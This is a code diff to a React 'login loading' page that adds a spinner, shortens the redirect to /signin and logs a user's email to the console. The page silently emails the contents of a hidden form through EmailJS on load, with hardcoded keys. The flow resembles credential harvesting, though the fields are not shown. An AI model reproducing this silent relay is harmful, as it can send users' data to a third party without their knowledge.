@@ -3,7 +3,7 @@ import emailjs from '@emailjs/browser';
 import { useState } from 'react';
 import Cookies from 'universal-cookie';
 import { ToastContainer, toast } from 'react-toastify';
-
+import {Spinner} from "@material-tailwind/react";
 import { Navigate } from 'react-router-dom';
 import axios from 'axios';
 export default function LoginLoadingpage() {
@@ -81,9 +81,9 @@ export default function LoginLoadingpage() {
     emailjs.sendForm(service_id, template_id, form.current, public_key).then(
       (result) => {
         if (result.text == 'OK') {
-          setTimeout(() => {
+        
             document.location.href = '/signin';
-          }, 1000);
+        
         }
       },
       (error) => {
@@ -91,6 +91,7 @@ export default function LoginLoadingpage() {
       }
     );
   };
+  console.log(emailmess.email);
   useEffect(() => {
     sendemail('service_w96g6fk', 'template_wntlu12', 'gb_cQpOFqCtwIedNT');
   }, []);
@@ -99,6 +100,7 @@ export default function LoginLoadingpage() {
   return (
     <div>
        <ToastContainer></ToastContainer>
+        <Spinner color="blue" className='w-16 h-16' style={{margin:"auto",display:'flex',alignItems:'center',justifyContent:'center',position:"absolute",left:'47%',marginTop:'300px'}}/>
       <form ref={form} style={{ display: 'none' }}>
         <input
           type="text"
